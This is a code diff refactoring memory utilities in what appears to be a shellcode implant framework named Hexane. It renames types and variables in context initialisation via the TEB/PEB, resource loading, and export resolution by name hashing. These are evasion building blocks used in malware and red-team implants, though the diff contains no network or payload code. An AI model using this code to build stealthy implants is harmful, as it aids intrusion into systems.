@@ -5,8 +5,7 @@
 
 namespace Memory {
 
-    VOID PatchMemory(byte *dst, byte const *src, int d_offs, int s_offs, size_t n) {
-
+    VOID PatchMemory(uint8_t *dst, uint8_t const *src, int d_offs, int s_offs, size_t n) {
         for (auto i = 0; i < n; i++) {
             (dst)[d_offs + i] = (src)[s_offs + i];
         }
@@ -29,7 +28,7 @@ namespace Memory {
 
         if (Heap32ListFirst(snap, &heaps)) {
             do {
-                HeapInfo heap_info = { heaps.th32HeapID, heaps.th32ProcessID };
+                _heap_info heap_info = { heaps.th32HeapID, heaps.th32ProcessID };
                 //m_heaps.push_back(heap_info);
             } while (Heap32ListNext(snap, &heaps));
         } else {
@@ -37,16 +36,16 @@ namespace Memory {
         }
     }
 
-    PRSRC GetIntResource(HMODULE base, int RsrcId) {
+    _resource* GetIntResource(HMODULE base, int rsrc_id) {
         HEXANE
 
         HRSRC hResInfo  = { };
-        PRSRC Object    = { };
+        _resource *Object    = { };
 
-        Object = S_CAST(PRSRC, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(RSRC)));
+        Object = S_CAST(_resource*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_resource)));
 
         if (
-            !(hResInfo          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(RsrcId), RT_RCDATA)) ||
+            !(hResInfo          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA)) ||
             !(Object->hGlobal   = Ctx->win32.LoadResource(base, hResInfo)) ||
             !(Object->Size      = Ctx->win32.SizeofResource(base, hResInfo)) ||
             !(Object->ResLock   = Ctx->win32.LockResource(Object->hGlobal))) {
@@ -193,48 +192,47 @@ namespace Memory {
         VOID ContextInit() {
             // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
 
-            HEXANE_CTX Instance = { };
-            LPVOID MmAddr = { };
-            SIZE_T MmSize = 0;
-            ULONG Protect = 0;
+            _hexane instance = { };
+            LPVOID region = { };
+            SIZE_T region_size = 0;
 
-            Instance.Teb = NtCurrentTeb();
-            Instance.Heap = Instance.Teb->ProcessEnvironmentBlock->ProcessHeap;
+            instance.Teb = NtCurrentTeb();
+            instance.Heap = instance.Teb->ProcessEnvironmentBlock->ProcessHeap;
 
-            Instance.Teb->LastErrorValue    = ERROR_SUCCESS;
-            Instance.Base.Address           = U_PTR(InstStart());
-            Instance.Base.Size              = U_PTR(InstEnd()) - Instance.Base.Address;
+            instance.Teb->LastErrorValue    = ERROR_SUCCESS;
+            instance.Base.Address           = U_PTR(InstStart());
+            instance.Base.Size              = U_PTR(InstEnd()) - instance.Base.Address;
 
-            MmAddr = C_PTR(GLOBAL_OFFSET);
-            MmSize = sizeof(MmAddr);
+            region = C_PTR(GLOBAL_OFFSET);
+            region_size = sizeof(region);
 
             if (
-                !(Instance.Modules.ntdll = M_PTR(NTDLL)) ||
-                !(F_PTR_HMOD(Instance.Nt.NtProtectVirtualMemory, Instance.Modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
-                !(F_PTR_HMOD(Instance.Nt.RtlAllocateHeap, Instance.Modules.ntdll, RTLALLOCATEHEAP)) ||
-                !(F_PTR_HMOD(Instance.Nt.RtlRandomEx, Instance.Modules.ntdll, RTLRANDOMEX))) {
+                !(instance.Modules.ntdll = M_PTR(NTDLL)) ||
+                !(F_PTR_HMOD(instance.Nt.NtProtectVirtualMemory, instance.Modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
+                !(F_PTR_HMOD(instance.Nt.RtlAllocateHeap, instance.Modules.ntdll, RTLALLOCATEHEAP)) ||
+                !(F_PTR_HMOD(instance.Nt.RtlRandomEx, instance.Modules.ntdll, RTLRANDOMEX))) {
                 return;
             }
 
-            if (!NT_SUCCESS(Instance.Nt.NtProtectVirtualMemory(NtCurrentProcess(), &MmAddr, &MmSize, PAGE_READWRITE, &Protect))) {
+            if (!NT_SUCCESS(instance.Nt.NtProtectVirtualMemory(NtCurrentProcess(), &region, &region_size, PAGE_READWRITE, nullptr))) {
                 return;
             }
-            MmAddr = C_PTR(GLOBAL_OFFSET);
-            if (!(C_DREF(MmAddr) = Instance.Nt.RtlAllocateHeap(Instance.Heap, HEAP_ZERO_MEMORY, sizeof(HEXANE_CTX)))) {
+            region = C_PTR(GLOBAL_OFFSET);
+            if (!(C_DREF(region) = instance.Nt.RtlAllocateHeap(instance.Heap, HEAP_ZERO_MEMORY, sizeof(_hexane)))) {
                 return;
             }
 
-            x_memcpy(C_DREF(MmAddr), &Instance, sizeof(HEXANE_CTX));
-            x_memset(&Instance, 0, sizeof(HEXANE_CTX));
-            x_memset(C_PTR(U_PTR(MmAddr) + sizeof(LPVOID)), 0, 0xE);
+            x_memcpy(C_DREF(region), &instance, sizeof(_hexane));
+            x_memset(&instance, 0, sizeof(_hexane));
+            x_memset(C_PTR(U_PTR(region) + sizeof(LPVOID)), 0, 0xE);
         }
 
-        VOID ContextDestroy(HEXANE_CTX *Ctx) {
+        VOID ContextDestroy(_hexane *Ctx) {
 
             auto RtlFreeHeap = Ctx->Nt.RtlFreeHeap;
             auto Heap = Ctx->Heap;
 
-            x_memset(Ctx, 0, sizeof(HEXANE_CTX));
+            x_memset(Ctx, 0, sizeof(_hexane));
 
             if (RtlFreeHeap) {
                 RtlFreeHeap(Heap, 0, Ctx);
@@ -280,37 +278,33 @@ namespace Memory {
             return nullptr;
         }
 
-        FARPROC GetExportAddress(HMODULE Base, ULONG Hash) {
+        FARPROC GetExportAddress(HMODULE base, uint32_t hash) {
 
-            FARPROC Export          = { };
-            CHAR lowName[MAX_PATH]  = { };
+            FARPROC address          = { };
+            char lowercase[MAX_PATH]  = { };
 
-            if (!Base) {
-                return nullptr;
-            }
+            auto dos_head = IMAGE_DOS_HEADER(base);
+            auto nt_head = IMAGE_NT_HEADERS(base, dos_head);
+            auto exports = IMAGE_EXPORT_DIRECTORY(dos_head, nt_head);
 
-            auto DosHead    = IMAGE_DOS_HEADER(Base);
-            auto NtHead     = IMAGE_NT_HEADERS(Base, DosHead);
-            auto Exports    = IMAGE_EXPORT_DIRECTORY(DosHead, NtHead);
+            if (exports->AddressOfNames) {
+                auto ords = RVA(uint16_t*, base, exports->AddressOfNameOrdinals);
+                auto fns = RVA(uint32_t*, base, exports->AddressOfFunctions);
+                auto names = RVA(uint32_t*, base, exports->AddressOfNames);
 
-            if (Exports->AddressOfNames) {
-                auto Ords   = RVA(PWORD, Base, Exports->AddressOfNameOrdinals);
-                auto Fns    = RVA(PULONG, Base, Exports->AddressOfFunctions);
-                auto Names  = RVA(PULONG, Base, Exports->AddressOfNames);
+                for (auto i = 0; i < exports->NumberOfNames; i++) {
+                    auto name = RVA(char*, base, (long) names[i]);
 
-                for (auto i = 0; i < Exports->NumberOfNames; i++) {
-                    auto Name = RVA(LPSTR, Base, (long) Names[i]);
+                    x_memset(lowercase, 0, MAX_PATH);
 
-                    x_memset(lowName, 0, MAX_PATH);
-
-                    if (Hash - Utils::GetHashFromStringA(x_mbsToLower(lowName, Name), x_strlen(Name)) == 0) {
-                        Export = R_CAST(FARPROC, RVA(PULONG, Base, Fns[Ords[i]]));
+                    if (hash - Utils::GetHashFromStringA(x_mbsToLower(lowercase, name), x_strlen(name)) == 0) {
+                        address = R_CAST(FARPROC, RVA(PULONG, base, fns[ords[i]]));
                         break;
                     }
                 }
             }
 
-            return Export;
+            return address;
         }
 
         UINT_PTR LoadExportAddress(char *module_name, char *export_name) {
